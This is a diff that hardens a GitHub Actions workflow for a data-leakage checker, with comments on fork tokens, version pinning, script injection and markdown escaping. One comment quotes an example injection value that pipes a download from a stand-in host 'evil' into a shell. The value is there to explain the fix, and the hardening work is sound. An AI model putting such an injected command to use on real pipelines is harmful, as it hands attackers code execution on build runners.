@@ -13,6 +13,18 @@ on:
       - "**/*.csv"
       - "**/*.parquet"
 
+# DO NOT change this to `pull_request_target`.
+#
+# On a pull_request event from a fork, GITHUB_TOKEN is read-only no matter what
+# the permissions block below says, so the comment step will 403 on exactly the
+# outside contributions this check is for. The documented workaround is
+# `pull_request_target` - and that gives a WRITE token to a job that runs over
+# data the PR author supplied. Add `ref: <head sha>` to the checkout after that
+# and you have handed a stranger your repository.
+#
+# The job summary below needs no token at all and always works, including on
+# forks. Treat the PR comment as the optional extra: it works for branches in
+# your own repo and is skipped, not failed, elsewhere.
 permissions:
   contents: read
   pull-requests: write
@@ -22,21 +34,29 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
 
       - uses: actions/setup-python@v5
         with:
           python-version: "3.12"
 
-      - run: pip install "targetleak[parquet]"
+      # Pin the version. This job holds a write token; an unpinned install runs
+      # whatever setup code the next release ships.
+      - run: pip install "targetleak[parquet]==0.1.0"
 
       - name: Check for leakage
         id: check
-        continue-on-error: true       # comment first, fail the job after
+        continue-on-error: true       # report first, fail the job after
+        # Passed through the environment, never interpolated into the script.
+        # `${{ }}` is substituted before bash parses the line, so quotes around
+        # it are not a boundary: a variable set to `y" ; curl evil | sh ; #`
+        # would execute on this runner.
+        env:
+          TARGET: ${{ vars.TARGET_COLUMN || 'y' }}
         run: |
-          targetleak data/train.csv --target "${{ vars.TARGET_COLUMN || 'y' }}" \
-            --json > findings.json
-          targetleak data/train.csv --target "${{ vars.TARGET_COLUMN || 'y' }}" \
-            --html report.html
+          targetleak data/train.csv --target "$TARGET" --json > findings.json
+          targetleak data/train.csv --target "$TARGET" --html report.html
 
       - name: Upload the HTML report
         uses: actions/upload-artifact@v4
@@ -45,15 +65,28 @@ jobs:
           name: leak-report
           path: report.html
 
-      - name: Build the comment
+      - name: Build the report
         if: always()
         run: |
           python - <<'PY' > comment.md
           import json, pathlib
+
+          MARKER = "<!-- targetleak-report -->"
+
+          def cell(s):
+              """Column names come from the data file, so a contributor picks
+              them. A header quoted across a newline ends the table row and the
+              next line renders as another row - an attacker-authored 'no leaks
+              found, approved' line under the bot's own identity. Flatten and
+              escape every cell."""
+              return (str(s).replace("\\", "\\\\").replace("|", "\\|")
+                      .replace("`", "\\`").replace("<", "&lt;")
+                      .replace("\r", " ").replace("\n", " ").strip())
+
           d = json.loads(pathlib.Path("findings.json").read_text())
           crit = [f for f in d["findings"] if f["severity"] == "critical"]
           warn = [f for f in d["findings"] if f["severity"] == "warning"]
-          out = ["## targetleak", ""]
+          out = [MARKER, "## targetleak", ""]
           if crit:
               out.append(f"**{len(crit)} critical finding(s).** "
                          "Do not trust this model's test score until resolved.")
@@ -65,18 +98,28 @@ jobs:
               out += ["", "| | column | finding |", "|---|---|---|"]
               icon = {"critical": "🛑", "warning": "⚠️"}
               for f in crit + warn:
-                  col = f"`{f['column']}`" if f["column"] else "-"
+                  col = f"`{cell(f['column'])}`" if f["column"] else "-"
                   out.append(f"| {icon[f['severity']]} | {col} | "
-                             f"{f['kind']}: {f['detail']} |")
+                             f"{cell(f['kind'])}: {cell(f['detail'])} |")
           if d.get("fix_code"):
+              # Safe to fence: fix_code() emits Python via repr(), which
+              # escapes newlines, so a column name cannot close the block.
               out += ["", "<details><summary>Remediation code</summary>", "",
                       "```python", d["fix_code"], "```", "", "</details>"]
           out += ["", "_Full HTML report is in this run's artifacts._"]
           print("\n".join(out))
           PY
 
-      - name: Comment on the PR
+      # Needs no token, so this works on fork PRs where the comment cannot.
+      - name: Job summary
         if: always()
+        run: cat comment.md >> "$GITHUB_STEP_SUMMARY"
+
+      # Best-effort. On a fork PR the token is read-only and this is skipped -
+      # the job summary above already carries the same report.
+      - name: Comment on the PR
+        if: always() && github.event.pull_request.head.repo.full_name == github.repository
+        continue-on-error: true
         uses: actions/github-script@v7
         with:
           script: |
@@ -85,11 +128,14 @@ jobs:
             const {owner, repo} = context.repo;
             const issue_number = context.issue.number;
             // Update one comment in place instead of adding a new one each push.
-            const marker = '## targetleak';
+            // Matched on a hidden marker and this action's own identity: a
+            // heading match would adopt and overwrite any other bot's comment
+            // that happened to start with the same words.
+            const marker = '<!-- targetleak-report -->';
             const existing = await github.paginate(
               github.rest.issues.listComments, {owner, repo, issue_number});
             const mine = existing.find(c =>
-              c.user.type === 'Bot' && c.body.startsWith(marker));
+              c.user.login === 'github-actions[bot]' && c.body.includes(marker));
             if (mine) {
               await github.rest.issues.updateComment(
                 {owner, repo, comment_id: mine.id, body});
